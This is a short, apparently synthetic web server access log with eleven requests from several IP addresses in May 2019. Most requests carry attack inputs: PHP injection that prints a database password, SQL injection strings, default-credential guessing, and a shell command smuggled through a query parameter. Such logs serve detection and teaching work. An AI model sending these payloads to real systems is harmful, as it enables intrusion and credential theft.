220.243.135.5 - - [18/May/2019:03:13:51 +0200] "GET /login.php/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 200 69739 "/update.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11"
183.87.255.54 - - [18/May/2019:03:13:52 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 7687 "/api/v1/register/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:13:53 +0200] "GET /index.php/?username=admin&password=1234 HTTP/1.0" 200 61324 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:13:54 +0200] "GET /?username=admin&password=1234 HTTP/1.0" 200 26657 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:13:55 +0200] "GET /api/v1/login/ HTTP/1.0" 200 21543 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
182.34.27.162 - - [18/May/2019:03:13:56 +0200] "GET /index.php/ HTTP/1.0" 200 71445 "/core/files/js/editor.js/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:13:57 +0200] "GET /index.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 200 77196 "/xmlrpc.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:58 +0200] "GET /?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.1" 404 38846 "/cgi-bin/count.cgi/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
115.221.121.44 - - [18/May/2019:03:13:59 +0200] "GET /login.php/?id=0%20or%201=1 HTTP/1.1" 200 57734 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:14:00 +0200] "GET /?username=admin&password=1239 HTTP/1.0" 200 61874 "/update.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
54.36.149.94 - - [18/May/2019:03:14:01 +0200] "GET /?ip=|+ls+-l HTTP/1.0" 200 1994 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
